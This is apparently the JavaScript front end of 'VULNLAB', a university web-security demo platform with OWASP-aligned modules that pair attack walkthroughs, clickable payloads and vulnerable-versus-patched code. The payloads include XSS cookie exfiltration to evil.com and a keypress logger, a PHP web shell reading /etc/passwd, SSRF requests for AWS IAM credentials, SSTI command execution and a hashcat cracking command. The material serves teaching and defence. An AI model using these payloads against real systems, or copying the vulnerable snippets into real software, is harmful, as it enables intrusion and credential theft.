const MODULES = [
  {
    id: "intro",
    title: "Welcome",
    owasp: "",
    sev: null,
    tagline: "Web Application Security — Complete Deep Dive",
    demoUrl: "/",
    intro: true,
  },
  {
    id: "sqli-auth",
    title: "SQL Injection — Auth Bypass",
    owasp: "A03:2021 · Injection",
    sev: "CRITICAL",
    tagline: "String concatenation lets attackers rewrite your SQL query. Login without knowing any password.",
    demoUrl: "/sqli/login",
    what: "SQL Injection occurs when user-supplied input is embedded directly into a SQL query without sanitisation. The attacker closes the intended string and appends their own SQL logic — changing what the database executes entirely.",
    how: [
      { n:"1", text:"Developer writes: ", code:"WHERE username='"+"{INPUT}'"+" AND password='"+"{PASS}'" },
      { n:"2", text:"Normal user enters: alice / password123", code:"→ Matches 1 row, login succeeds" },
      { n:"3", text:"Attacker enters username: ", code:"' OR '1'='1" },
      { n:"4", text:"Resulting query becomes: ", code:"WHERE username='' OR '1'='1' AND password='x'" },
      { n:"5", text:"'1'='1' is always true → ", code:"ALL rows returned → logged in as first user (admin)" },
    ],
    impact: {
      title: "Real-World Case — Heartland Payment Systems (2008)",
      text: "<strong>$140 million</strong> in damages. SQL injection into a payment processor. Attackers installed sniffing malware after initial SQLi access. 130 million credit card numbers stolen. Still one of the largest breaches ever.",
    },
    payloads: [
      { code: "' OR '1'='1", desc: "Always-true condition — bypasses password check" },
      { code: "admin'--", desc: "Login as admin — comment out the rest of the query" },
      { code: "' OR 1=1--", desc: "Same bypass with numeric comparison" },
      { code: "' UNION SELECT 1,'admin','admin123','a@a.com','admin',0,'x','x'--", desc: "Inject a fake row to login as crafted user" },
    ],
    vuln_code: `query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
row = conn.execute(query)  # ← executes attacker SQL`,
    safe_code: `stmt = conn.execute(
  "SELECT * FROM users WHERE username=? AND password=?",
  (username, password)   # ← input is data, never SQL
)`,
  },
  {
    id: "sqli-union",
    title: "SQL Injection — UNION Extract",
    owasp: "A03:2021 · Injection",
    sev: "CRITICAL",
    tagline: "UNION SELECT appends a second query — pull any table, any column, right into the response.",
    demoUrl: "/sqli/search",
    what: "Once SQL injection is confirmed, UNION-based extraction lets attackers append a second SELECT to the original query. The result of both queries is returned together — attacker sees data from any table.",
    how: [
      { n:"1", text:"Find column count: ", code:"' ORDER BY 1-- ... ORDER BY 4-- (error = found it)" },
      { n:"2", text:"Find string columns: ", code:"' UNION SELECT NULL,'a',NULL--  (look for 'a' in output)" },
      { n:"3", text:"Extract version/db: ", code:"' UNION SELECT NULL,version(),database()--" },
      { n:"4", text:"List tables: ", code:"' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--" },
      { n:"5", text:"Dump credentials: ", code:"' UNION SELECT NULL,username,password FROM users--" },
    ],
    impact: {
      title: "Real-World Case — Sony Pictures (2011)",
      text: "<strong>77 million accounts</strong> breached via SQL injection against PlayStation Network. Usernames, passwords, addresses, credit card data extracted. UNION-based SQLi used to enumerate and dump the full user database. Sony took PSN offline for 23 days.",
    },
    payloads: [
      { code: "' ORDER BY 3--", desc: "Step 1: Confirm 3 columns (no error = correct count)" },
      { code: "' UNION SELECT NULL,'test',NULL--", desc: "Step 2: Column 2 is a string type" },
      { code: "' UNION SELECT NULL,username,password FROM users--", desc: "Step 3: Dump all credentials" },
      { code: "' UNION SELECT NULL,username||':'||password||':'||ssn,email FROM users--", desc: "Concat multiple fields into one column" },
    ],
    vuln_code: `query = f"SELECT id,title,body FROM posts WHERE title LIKE '%{q}%'"
rows = conn.execute(query)   # UNION appended by attacker`,
    safe_code: `rows = conn.execute(
  "SELECT id,title,body FROM posts WHERE title LIKE ?",
  (f"%{q}%",)   # parameterised — UNION impossible
)`,
  },
  {
    id: "xss-reflected",
    title: "XSS — Reflected",
    owasp: "A03:2021 · Injection",
    sev: "CRITICAL",
    tagline: "User input reflected in the response without encoding. Script executes in the victim's browser.",
    demoUrl: "/xss/reflected",
    what: "Reflected XSS occurs when a web application takes user input from the request (URL parameter, form field) and includes it directly in the HTML response without encoding. The attacker crafts a URL containing a script — the victim's browser receives and executes it.",
    how: [
      { n:"1", text:"Attacker crafts URL: ", code:"/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>" },
      { n:"2", text:"Victim clicks the link (via email, chat, ad)", code:"" },
      { n:"3", text:"Server returns: ", code:"<p>Results for: <script>fetch(...)  ← executes" },
      { n:"4", text:"Victim's browser runs attacker's JavaScript", code:"" },
      { n:"5", text:"Session cookie sent to attacker server → ", code:"Account takeover without knowing the password" },
    ],
    impact: {
      title: "Real-World Case — British Airways (2018)",
      text: "XSS used as part of a Magecart attack. Attacker injected skimming script onto the BA payment page. <strong>500,000 customers'</strong> payment card details harvested in real-time. £20M GDPR fine. The injected script ran in every customer's browser during checkout.",
    },
    payloads: [
      { code: "<script>alert(document.cookie)</script>", desc: "Display cookies in alert box — confirm impact" },
      { code: "<img src=x onerror=alert(1)>", desc: "No script tag — fires via broken image" },
      { code: "<svg onload=alert(document.domain)>", desc: "SVG event-based XSS" },
      { code: "<ScRiPt>alert(1)</sCrIpT>", desc: "Mixed case — bypasses naive keyword filters" },
    ],
    vuln_code: `q = request.args.get("q", "")
output = q   # ← raw string into template
# Template: <div>{{ output | safe }}</div>  ← executes!`,
    safe_code: `import html
q = request.args.get("q", "")
output = html.escape(q)   # < → &lt;  > → &gt;
# Jinja2: {{ output }}  auto-escapes by default`,
  },
  {
    id: "xss-stored",
    title: "XSS — Stored",
    owasp: "A03:2021 · Injection",
    sev: "CRITICAL",
    tagline: "Payload saved to the database. Executes for every visitor — no victim interaction needed beyond browsing.",
    demoUrl: "/xss/stored",
    what: "Stored (Persistent) XSS is saved into the database and served to every user who views the page. Unlike reflected XSS, no crafted URL is needed — the victim just browses normally. Admin visits a comments page → attacker has admin's session.",
    how: [
      { n:"1", text:"Attacker posts comment: ", code:"<script>fetch('//evil.com?c='+document.cookie)</script>" },
      { n:"2", text:"Server stores raw HTML in database", code:"" },
      { n:"3", text:"Every visitor loads the page → comment rendered", code:"" },
      { n:"4", text:"Script executes in visitor's browser", code:"" },
      { n:"5", text:"If admin visits → admin cookie captured → ", code:"Full admin access for attacker" },
    ],
    impact: {
      title: "Real-World Case — Samy Worm, MySpace (2005)",
      text: "Samy Kamkar stored XSS in a MySpace profile. Every visitor's profile was automatically modified to add Samy as a friend and propagate the worm. <strong>1 million profiles infected in 20 hours</strong>. First large-scale XSS worm. Same technique used today against banking portals.",
    },
    payloads: [
      { code: "<script>alert('stored XSS by '+document.domain)</script>", desc: "Confirm stored XSS fires on page load" },
      { code: "<script>fetch('http://localhost:5000/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d[0])))</script>", desc: "Exfil API data via stored payload" },
      { code: "<script>document.onkeypress=e=>fetch('//log?k='+e.key)</script>", desc: "Keylogger — captures everything typed on page" },
      { code: "<img src=x onerror=\"document.body.innerHTML='<h1 style=color:red>HACKED</h1>'\">", desc: "Full page defacement" },
    ],
    vuln_code: `body = request.form.get("body", "")
# Stored raw to DB — no encoding
conn.execute("INSERT INTO comments (body) VALUES (?)", (body,))
# Template: {{ c.body | safe }}  ← executes on render`,
    safe_code: `import html
body = html.escape(request.form.get("body", ""))
# Encoded before storage — < saved as &lt;
conn.execute("INSERT INTO comments (body) VALUES (?)", (body,))
# Template: {{ c.body }}  ← auto-escaped, safe`,
  },
  {
    id: "idor",
    title: "IDOR — Broken Access Control",
    owasp: "A01:2021 · Broken Access Control",
    sev: "CRITICAL",
    tagline: "#1 on OWASP. Server authenticates who you are — but never checks if you own the object you're requesting.",
    demoUrl: "/idor/profile",
    what: "Insecure Direct Object Reference — the server checks that you're logged in, but not that the resource you're requesting belongs to you. Change a user ID in the URL from 2 to 1 and see admin's data. Authentication ≠ Authorisation.",
    how: [
      { n:"1", text:"Login as alice (user id=2)", code:"" },
      { n:"2", text:"App loads your profile: ", code:"GET /idor/profile?id=2" },
      { n:"3", text:"Change id to 1: ", code:"GET /idor/profile?id=1" },
      { n:"4", text:"Server fetches user #1 from DB", code:"SELECT * FROM users WHERE id=1" },
      { n:"5", text:"Returns admin's email, SSN, balance, password → ", code:"Full account data exposed" },
    ],
    impact: {
      title: "Real-World Case — Optus Australia (2022)",
      text: "<strong>9.8 million customers'</strong> personal data exposed via IDOR on an unauthenticated API endpoint. ID was sequential — attacker incremented through all customer IDs. Passport numbers, driver's licences, Medicare IDs all leaked. $140M+ in remediation costs.",
    },
    payloads: [
      { code: "/idor/profile?id=1", desc: "View admin profile — password, SSN, balance" },
      { code: "/idor/profile?id=3", desc: "View Bob's private profile" },
      { code: "/idor/orders?user_id=1", desc: "View admin's order history" },
      { code: "/api/message/1", desc: "Read message not addressed to you" },
    ],
    vuln_code: `target_id = request.args.get("id")   # attacker-controlled
# No ownership check — fetches whatever ID supplied
row = conn.execute(
  "SELECT * FROM users WHERE id=?", (target_id,)
)`,
    safe_code: `target_id = request.args.get("id")
# Enforce ownership — must match session
if int(target_id) != session["user_id"]:
    return 403   # access denied
row = conn.execute(
  "SELECT * FROM users WHERE id=?", (session["user_id"],)
)`,
  },
  {
    id: "csrf",
    title: "CSRF — Cross-Site Request Forgery",
    owasp: "A01:2021 · Broken Access Control",
    sev: "HIGH",
    tagline: "Your browser auto-attaches cookies to any request. An attacker's page can trigger authenticated actions on your behalf.",
    demoUrl: "/csrf/transfer",
    what: "CSRF forces an authenticated user's browser to send a forged request to a web application. The browser automatically includes session cookies — the server sees a legitimate authenticated request. Victim doesn't know it happened.",
    how: [
      { n:"1", text:"Victim logs into bank.com → session cookie set", code:"" },
      { n:"2", text:"Victim visits evil.com (ad, forum link, phishing email)", code:"" },
      { n:"3", text:"Evil page has auto-submit form targeting bank.com", code:"<form action='//bank.com/transfer' method=POST>" },
      { n:"4", text:"Browser sends POST to bank.com with session cookie", code:"Cookie auto-attached — browser's default behaviour" },
      { n:"5", text:"Bank processes authenticated request → ", code:"Transfer executed. Victim has no idea." },
    ],
    impact: {
      title: "Real-World Case — ING Direct / YouTube (2008)",
      text: "CSRF used to transfer funds out of ING Direct accounts. Attacker hosted page that auto-submitted transfer forms — victims just needed to visit the page while logged in. Same year, CSRF on YouTube allowed arbitrary actions on any user's account. <strong>No malware needed — just a browser.</strong>",
    },
    payloads: [
      { code: '<form action="//localhost:5000/csrf/transfer?safe=0" method=POST>', desc: "Attack form targeting the transfer endpoint" },
      { code: '<input name="to_user" value="attacker">', desc: "Recipient — attacker's account" },
      { code: '<input name="amount" value="9999">', desc: "Amount — maximum" },
      { code: 'document.forms[0].submit()', desc: "Auto-submit on page load — victim sees nothing" },
    ],
    vuln_code: `# No CSRF token generated or validated
@app.route("/transfer", methods=["POST"])
def transfer():
    to = request.form.get("to_user")
    amount = request.form.get("amount")
    # Processes without checking request origin`,
    safe_code: `# Validate CSRF token on every state-changing request
token = request.form.get("csrf_token", "")
if not hmac.compare_digest(token, session["csrf_token"]):
    return 403  # forged request rejected
# Also: Set-Cookie: SameSite=Strict`,
  },
  {
    id: "fileupload",
    title: "File Upload → RCE",
    owasp: "A03:2021 · Injection",
    sev: "CRITICAL",
    tagline: "Unrestricted file upload lets attackers upload executable code. One request from unauthenticated shell access.",
    demoUrl: "/upload",
    what: "When file upload endpoints don't validate file type properly, attackers upload web shells — scripts that execute OS commands when accessed via HTTP. A PHP shell uploaded as 'profile picture' becomes remote code execution on the server.",
    how: [
      { n:"1", text:"Create PHP web shell: ", code:"<?php system($_GET['cmd']); ?>" },
      { n:"2", text:"Save as shell.php (or shell.php.jpg to bypass filters)", code:"" },
      { n:"3", text:"Upload via the file upload form", code:"" },
      { n:"4", text:"Server saves with original filename in web-accessible directory", code:"" },
      { n:"5", text:"Request the file with a command: ", code:"/uploads/shell.php?cmd=id  →  uid=33(www-data)" },
    ],
    impact: {
      title: "Real-World Case — Multiple WordPress Sites (ongoing)",
      text: "File upload vulnerabilities in WordPress plugins are among the most exploited bugs. Attackers upload PHP shells via image upload fields. <strong>Tens of thousands of sites compromised monthly</strong> via unrestricted file upload. Once a shell is placed, attackers pivot to databases, steal credentials, and install persistent backdoors.",
    },
    payloads: [
      { code: "<?php system($_GET['cmd']); ?>", desc: "Minimal PHP web shell — save as shell.php" },
      { code: "/upload/serve/shell.php?cmd=id", desc: "Execute id command after upload" },
      { code: "/upload/serve/shell.php?cmd=cat+/etc/passwd", desc: "Read /etc/passwd" },
      { code: "shell.php.jpg  or  shell.pHp", desc: "Extension bypass — rename to evade naive filters" },
    ],
    vuln_code: `filename = f.filename   # original name — attacker-controlled
path = os.path.join(UPLOAD_DIR, filename)
f.save(path)            # saved as shell.php
# Served directly at /uploads/shell.php → executes!`,
    safe_code: `ext = filename.rsplit(".",1)[-1].lower()
if ext not in {"jpg","jpeg","png","gif"}: abort(400)
if not check_magic_bytes(f.read()): abort(400)
safe_name = f"{uuid.uuid4()}.{ext}"   # UUID rename
# Store outside webroot, serve via CDN`,
  },
  {
    id: "ssrf",
    title: "SSRF — Server-Side Request Forgery",
    owasp: "A10:2021 · SSRF",
    sev: "HIGH",
    tagline: "Make the server fetch URLs on your behalf — including cloud metadata, internal services, and AWS IAM credentials.",
    demoUrl: "/ssrf/fetch",
    what: "SSRF tricks the server into making HTTP requests to attacker-specified URLs. The server has internal network access the attacker doesn't — to databases, cloud metadata APIs, admin interfaces. The server becomes the attacker's proxy inside the network.",
    how: [
      { n:"1", text:"App has a URL fetch feature (preview, webhook, PDF gen)", code:"GET /fetch?url=https://partner.com/data" },
      { n:"2", text:"Attacker supplies internal URL: ", code:"GET /fetch?url=http://169.254.169.254/latest/meta-data/" },
      { n:"3", text:"Server fetches the metadata URL from inside the cloud network", code:"" },
      { n:"4", text:"Returns IAM role name: EC2InstanceRole", code:"" },
      { n:"5", text:"Fetch credentials: ", code:"/iam/security-credentials/EC2InstanceRole  →  AccessKeyId, SecretAccessKey" },
    ],
    impact: {
      title: "Real-World Case — Capital One (2019)",
      text: "SSRF against AWS Instance Metadata Service. Attacker obtained IAM role credentials → listed all S3 buckets → downloaded contents. <strong>106 million customers</strong> affected. $190 million in fines and settlements. One misconfigured WAF, one SSRF endpoint — full cloud compromise.",
    },
    payloads: [
      { code: "http://169.254.169.254/latest/meta-data/", desc: "AWS root metadata — lists available endpoints" },
      { code: "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole", desc: "IAM temporary credentials — AccessKeyId + Secret" },
      { code: "http://0x7f000001/admin", desc: "127.0.0.1 in hex — bypasses naive localhost blocklist" },
      { code: "http://localhost:6379", desc: "Redis on loopback — read cached sessions" },
    ],
    vuln_code: `url = request.args.get("url")
# No validation — fetches anything
response = urllib.request.urlopen(url)
return response.read()   # returns internal data to attacker`,
    safe_code: `parsed = urlparse(url)
host = parsed.hostname
BLOCKED = ["169.254.","10.","192.168.","127.","localhost"]
if any(host.startswith(b) for b in BLOCKED):
    abort(403)   # internal ranges blocked
if parsed.scheme not in ("http","https"): abort(403)`,
  },
  {
    id: "jwt",
    title: "JWT — None Algorithm & Weak Secret",
    owasp: "A07:2021 · Auth Failures",
    sev: "HIGH",
    tagline: "JWT accepts alg:none — forge admin tokens with no secret. Or crack the weak HMAC secret with hashcat.",
    demoUrl: "/jwt/login",
    what: "JSON Web Tokens are used for stateless auth. Two critical vulnerabilities: 1) Some libraries accept alg:none — skipping signature verification entirely, allowing anyone to forge tokens. 2) HS256 with a weak secret is crackable offline with hashcat.",
    how: [
      { n:"1", text:"Login normally → receive JWT with role:user", code:"eyJ...{\"role\":\"user\"}...signature" },
      { n:"2", text:"Decode the header (base64): ", code:"{\"alg\": \"HS256\", \"typ\": \"JWT\"}" },
      { n:"3", text:"Change alg to none, role to admin: ", code:"{\"alg\":\"none\"} + {\"role\":\"admin\",\"user_id\":1}" },
      { n:"4", text:"Re-encode header + payload, empty signature: ", code:"eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." },
      { n:"5", text:"Server accepts token without verifying signature → ", code:"Attacker is now admin" },
    ],
    impact: {
      title: "Real-World — Auth0 (2015) & Multiple Libraries",
      text: "The none algorithm vulnerability affected Auth0, python-jwt, pyjwt, node-jsonwebtoken and others. <strong>Hundreds of thousands of applications</strong> were vulnerable. Any user could promote themselves to admin by changing 3 characters in the token header. CVE-2015-9235.",
    },
    payloads: [
      { code: 'header: {"alg":"none","typ":"JWT"}', desc: "Step 1: Change algorithm to none" },
      { code: 'payload: {"user_id":1,"role":"admin","exp":9999999999}', desc: "Step 2: Set role to admin" },
      { code: "base64(header) + '.' + base64(payload) + '.'", desc: "Step 3: Empty signature — dot at end" },
      { code: "hashcat -a 0 -m 16500 token.txt rockyou.txt", desc: "Alternative: crack weak HS256 secret offline" },
    ],
    vuln_code: `# VULNERABLE: accepts alg:none — no verification
alg = header.get("alg","").lower()
if alg == "none":
    pass   # ← skip signature check entirely
# Also: secret = "weak"  ← crackable`,
    safe_code: `# Enforce algorithm, use strong secret
if header.get("alg") != "HS256":
    return None   # reject anything else
secret = "Str0ng-R4nd0m-256bit-S3cr3t!"
# Verify signature cryptographically
if not hmac.compare_digest(expected, provided):
    return None`,
  },
  {
    id: "ssti",
    title: "SSTI — Server-Side Template Injection",
    owasp: "A03:2021 · Injection",
    sev: "CRITICAL",
    tagline: "User input rendered as a Jinja2 template. Escalates from {{7*7}} to reading config secrets to full RCE.",
    demoUrl: "/ssti",
    what: "SSTI occurs when user input is embedded into a template string and rendered by the template engine. In Jinja2, the template engine evaluates expressions — attackers use this to read configuration, access Python internals, and ultimately execute OS commands.",
    how: [
      { n:"1", text:"Probe: enter ", code:"{{7*7}}  →  output shows 49 = SSTI confirmed" },
      { n:"2", text:"Read config: ", code:"{{config.items()}}  →  SECRET_KEY, DB passwords exposed" },
      { n:"3", text:"Access Python MRO: ", code:"{{''.__class__.__mro__[1].__subclasses__()}}" },
      { n:"4", text:"Find subprocess class, execute command: ", code:"{{lipsum.__globals__['os'].popen('id').read()}}" },
      { n:"5", text:"Output: ", code:"uid=33(www-data)  →  Full server RCE" },
    ],
    impact: {
      title: "Real-World — Uber HackerOne Report (2016)",
      text: "SSTI in Uber's internal tooling allowed researcher to achieve RCE. Reported via bug bounty — classified critical. SSTI is consistently rated <strong>Critical severity</strong> because it always leads to RCE if the template engine allows expression evaluation. Payouts: $10,000–$50,000 on bug bounty programs.",
    },
    payloads: [
      { code: "{{7*7}}", desc: "Detection — if output is 49, SSTI confirmed" },
      { code: "{{config}}", desc: "Flask config dump — leaks SECRET_KEY, DB URI" },
      { code: "{{request.environ}}", desc: "Server environment — paths, ports, versions" },
      { code: "{{lipsum.__globals__['os'].popen('id').read()}}", desc: "RCE — execute system command" },
    ],
    vuln_code: `name = request.args.get("name")
# User input directly in template string → SSTI
result = render_template_string(f"Hello, {name}!")
# {{config}} in name → leaks all Flask config`,
    safe_code: `import html
name = html.escape(request.args.get("name",""))
result = f"Hello, {name}!"
# OR: return render_template("greet.html", name=name)
# Jinja2 {{ name }} auto-escapes — no expression eval`,
  },
  {
    id: "headers",
    title: "Security Headers",
    owasp: "A05:2021 · Security Misconfiguration",
    sev: "HIGH",
    tagline: "Each missing header enables a class of attack. No CSP = XSS easier. No X-Frame = clickjacking. No HSTS = downgrade.",
    demoUrl: "/headers",
    what: "HTTP security headers are the server's instructions to the browser about security policies. Each missing header is an open door. They're free to add, take minutes, and block entire attack classes. Yet most applications are missing several.",
    how: [
      { n:"1", text:"No Content-Security-Policy → ", code:"Inline scripts can run. XSS has no mitigation layer." },
      { n:"2", text:"No X-Frame-Options → ", code:"Page can be iframed. Clickjacking trivially possible." },
      { n:"3", text:"No HSTS → ", code:"Attacker on network can downgrade HTTPS to HTTP. Cookies stolen." },
      { n:"4", text:"No X-Content-Type-Options → ", code:"MIME sniffing — browser executes uploaded file as wrong type." },
      { n:"5", text:"Check your site: ", code:"curl -I https://yoursite.com | grep -i 'security\\|frame\\|content'" },
    ],
    impact: {
      title: "Real-World — Clickjacking on Facebook (2009) & Twitter",
      text: "Missing X-Frame-Options allowed clickjacking attacks that tricked users into clicking hidden 'Like' and 'Retweet' buttons. Called 'likejacking' — millions of posts spread automatically. <strong>Simple iframe trick, no code execution needed.</strong> Fixed with one HTTP header.",
    },
    payloads: [
      { code: "curl -I http://localhost:5000/headers?safe=0", desc: "See missing headers in vulnerable mode" },
      { code: "curl -I http://localhost:5000/headers?safe=1", desc: "See all security headers in safe mode" },
      { code: '<iframe src="//target.com" opacity="0.001">', desc: "Clickjacking PoC — works without X-Frame-Options" },
      { code: "securityheaders.com / observatory.mozilla.org", desc: "Online scanner for production sites" },
    ],
    vuln_code: `# No headers added to response
@app.route("/headers")
def headers():
    return render_template("headers.html")
# Response has: Server: Werkzeug, no security headers`,
    safe_code: `resp.headers["Content-Security-Policy"] = "default-src 'self'"
resp.headers["X-Frame-Options"] = "DENY"
resp.headers["X-Content-Type-Options"] = "nosniff"
resp.headers["Strict-Transport-Security"] = "max-age=31536000"
resp.headers["Referrer-Policy"] = "no-referrer"`,
  },
  {
    id: "logic",
    title: "Business Logic — Price Tampering",
    owasp: "A04:2021 · Insecure Design",
    sev: "HIGH",
    tagline: "App trusts the price field in the POST body. Intercept in Burp, change to 0.01. Buy a laptop for a penny.",
    demoUrl: "/logic/checkout",
    what: "Business logic vulnerabilities are flaws in the application's intended workflow — not injection or memory bugs. No scanner finds them. They require understanding what the app is supposed to do and testing what happens when you deviate. Trusting client-supplied prices is the classic example.",
    how: [
      { n:"1", text:"Open checkout, select Laptop ($999.99)", code:"" },
      { n:"2", text:"Intercept POST in Burp Suite", code:"item_id=1&quantity=1&price=999.99" },
      { n:"3", text:"Change price field to 0.01", code:"item_id=1&quantity=1&price=0.01" },
      { n:"4", text:"Forward the modified request", code:"" },
      { n:"5", text:"Server calculates: 0.01 × 1 = $0.01 → ", code:"Order confirmed. Laptop for a penny." },
    ],
    impact: {
      title: "Real-World — Multiple E-commerce Platforms",
      text: "Price manipulation has hit Shopify merchants, airline booking systems, and gaming platforms. In 2022, a UK retailer lost <strong>£50,000+</strong> to a price tampering attack over a weekend before it was noticed. The fix is trivial — look up price server-side. The vulnerability is subtle — developers assume form data isn't editable.",
    },
    payloads: [
      { code: "price=0.01", desc: "Buy a $999 laptop for a penny — change in Burp" },
      { code: "quantity=-1", desc: "Negative quantity → refund issued + item delivered" },
      { code: "price=-500", desc: "Negative price → credit added to account" },
      { code: "item_id=1&quantity=99999999", desc: "Integer overflow → total wraps to 0 or negative" },
    ],
    vuln_code: `client_price = float(request.form.get("price", 0))
quantity = int(request.form.get("quantity", 1))
# Trusts client price — attacker sets it to 0.01
total = client_price * quantity
place_order(item_id, total)`,
    safe_code: `item_id = int(request.form.get("item_id"))
quantity = int(request.form.get("quantity", 1))
# Look up REAL price server-side — ignore client value
item = db.get_item_by_id(item_id)
total = item.server_price * quantity
place_order(item_id, total)`,
  },
];

// ── STATE ────────────────────────────────────────────────────────────────────
let currentIdx = 0;
let safeMode = 0;

// ── INIT ─────────────────────────────────────────────────────────────────────
function init() {
  buildSidebar();
  renderModule(0);
  document.addEventListener("keydown", onKey);
  // Push state to server for notes sync
  pushState(0);
}

function buildSidebar() {
  const sidebar = document.getElementById("sidebar");
  MODULES.forEach((m, i) => {
    if (i === 0) return; // skip intro in sidebar
    const el = document.createElement("div");
    el.className = "sidebar-item";
    el.dataset.idx = i;
    el.innerHTML = `
      <span style="font-size:11px;">${m.title.split("—")[0].trim()}</span>
      ${m.sev ? `<span class="sev sev-${m.sev[0].toLowerCase()}">${m.sev[0]}</span>` : ''}
    `;
    el.onclick = () => navigate(i - currentIdx);
    sidebar.appendChild(el);
  });
}

function updateSidebar() {
  document.querySelectorAll(".sidebar-item").forEach(el => {
    el.classList.toggle("active", parseInt(el.dataset.idx) === currentIdx);
  });
}

// ── NAVIGATION ───────────────────────────────────────────────────────────────
function navigate(delta) {
  const next = currentIdx + delta;
  if (next < 0 || next >= MODULES.length) return;
  currentIdx = next;
  renderModule(currentIdx);
  pushState(currentIdx);
}

function onKey(e) {
  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
  if (e.key === "ArrowRight" || e.key === "ArrowDown") navigate(1);
  if (e.key === "ArrowLeft"  || e.key === "ArrowUp")   navigate(-1);
  if (e.key === "Escape") closeFullscreen();
  if (e.key === "f" || e.key === "F") openFullscreen();
}

function renderModule(idx) {
  const m = MODULES[idx];

  // Update counter + progress
  document.getElementById("mod-num").textContent = idx;
  const pct = idx === 0 ? 0 : (idx / (MODULES.length - 1)) * 100;
  document.getElementById("progress-fill").style.width = pct + "%";

  // Update buttons
  document.getElementById("btn-prev").disabled = (idx === 0);
  document.getElementById("btn-next").disabled = (idx === MODULES.length - 1);

  // Update sidebar
  updateSidebar();

  // Update demo iframe
  const demoUrl = buildDemoUrl(m.demoUrl);
  document.getElementById("demo-iframe").src = demoUrl;
  document.getElementById("demo-url-display").textContent = demoUrl;
  document.getElementById("fs-iframe").src = demoUrl;
  document.getElementById("fs-title").textContent = m.title;

  // Update safe pill
  updateSafePill();

  // Render theory
  if (m.intro) {
    renderIntro();
  } else {
    renderTheory(m);
  }
}

function buildDemoUrl(base) {
  if (!base) return "/";
  const sep = base.includes("?") ? "&" : "?";
  return `${base}${sep}safe=${safeMode}`;
}

// ── THEORY RENDERER ──────────────────────────────────────────────────────────
function renderIntro() {
  const el = document.getElementById("theory-scroll");
  el.innerHTML = `
    <div class="intro-slide">
      <div class="intro-title">VULNLAB</div>
      <div class="intro-sub">Web Application Security — Live Demo Platform</div>
      <div class="intro-meta">Yuvraj Todankar · Cybevion · University Cybersecurity Program</div>
      <div class="intro-grid">
        <div class="intro-card">
          <div class="num" style="color:var(--red);">14</div>
          <div class="lbl">Vulnerability Modules</div>
        </div>
        <div class="intro-card">
          <div class="num" style="color:var(--green);">2×</div>
          <div class="lbl">Vuln + Safe Mode Per Module</div>
        </div>
        <div class="intro-card">
          <div class="num" style="color:var(--blue);">OWASP</div>
          <div class="lbl">Top 10 Aligned</div>
        </div>
        <div class="intro-card">
          <div class="num" style="color:var(--yellow);">← →</div>
          <div class="lbl">Keyboard Navigation</div>
        </div>
        <div class="intro-card">
          <div class="num" style="color:var(--purple);">F</div>
          <div class="lbl">Fullscreen Demo</div>
        </div>
        <div class="intro-card">
          <div class="num" style="color:var(--cyan);">🗒</div>
          <div class="lbl">Speaker Notes Sync</div>
        </div>
      </div>
      <div style="margin-top:2rem;font-size:12px;color:var(--gray);">Press → or click Next to begin</div>
    </div>
  `;
}

function renderTheory(m) {
  const el = document.getElementById("theory-scroll");

  const severityColor = { CRITICAL: "var(--red)", HIGH: "var(--yellow)", MEDIUM: "var(--blue)" };
  const sc = severityColor[m.sev] || "var(--gray)";

  // Build how-it-works HTML
  const howHtml = (m.how || []).map(step => `
    <div class="flow-step">
      <div class="flow-num">${step.n}</div>
      <div class="flow-text">
        ${step.text}
        ${step.code ? `<span class="flow-code">${escHtml(step.code)}</span>` : ""}
      </div>
    </div>
  `).join("");

  // Build payloads HTML
  const payloadHtml = (m.payloads || []).map(p => `
    <div class="payload-item" onclick="injectPayload(${JSON.stringify(p.code)})">
      <div class="payload-code">${escHtml(p.code)}</div>
      <div class="payload-desc">${escHtml(p.desc)}</div>
    </div>
  `).join("");

  el.innerHTML = `
    <div class="mod-header">
      <div class="mod-owasp">
        <span style="color:${sc};font-weight:700;">${m.sev || ""}</span>
        ${m.sev ? " · " : ""}${m.owasp}
      </div>
      <div class="mod-title">${escHtml(m.title)}</div>
      <div class="mod-tagline">${escHtml(m.tagline)}</div>
    </div>

    <div class="section">
      <div class="section-title">What is it</div>
      <div class="what-box">${escHtml(m.what)}</div>
    </div>

    <div class="section">
      <div class="section-title">How it works</div>
      <div class="flow">${howHtml}</div>
    </div>

    <div class="section">
      <div class="section-title">Real-World Impact</div>
      <div class="impact-box">
        <div class="impact-title">${escHtml(m.impact?.title || "")}</div>
        <div class="impact-case">${m.impact?.text || ""}</div>
      </div>
    </div>

    <div class="section">
      <div class="section-title">Attack Payloads — Click to load in demo</div>
      <div class="payload-list">${payloadHtml}</div>
    </div>

    <div class="section">
      <div class="section-title">The Fix — Code Diff</div>
      <div class="diff-block diff-vuln">
        <div class="diff-header">❌ VULNERABLE</div>
        <div class="diff-code">${escHtml(m.vuln_code || "")}</div>
      </div>
      <div class="diff-block diff-safe">
        <div class="diff-header">✓ PATCHED</div>
        <div class="diff-code">${escHtml(m.safe_code || "")}</div>
      </div>
    </div>
  `;
}

function escHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// ── SAFE MODE ────────────────────────────────────────────────────────────────
function setSafe(val) {
  safeMode = val;
  updateSafePill();
  // Reload both iframes with new safe mode
  const m = MODULES[currentIdx];
  const url = buildDemoUrl(m.demoUrl);
  document.getElementById("demo-iframe").src = url;
  document.getElementById("fs-iframe").src = url;
  document.getElementById("demo-url-display").textContent = url;
}

function updateSafePill() {
  document.getElementById("pill-vuln").className = safeMode === 0 ? "active-vuln" : "";
  document.getElementById("pill-safe").className = safeMode === 1 ? "active-safe" : "";
  document.getElementById("fs-pill-vuln").className = safeMode === 0 ? "active-vuln" : "";
  document.getElementById("fs-pill-safe").className = safeMode === 1 ? "active-safe" : "";
}

// ── FULLSCREEN ───────────────────────────────────────────────────────────────
function openFullscreen() {
  document.getElementById("fs-overlay").classList.add("active");
  const m = MODULES[currentIdx];
  document.getElementById("fs-iframe").src = buildDemoUrl(m.demoUrl);
}

function closeFullscreen() {
  document.getElementById("fs-overlay").classList.remove("active");
}

function reloadDemo() {
  const m = MODULES[currentIdx];
  const url = buildDemoUrl(m.demoUrl);
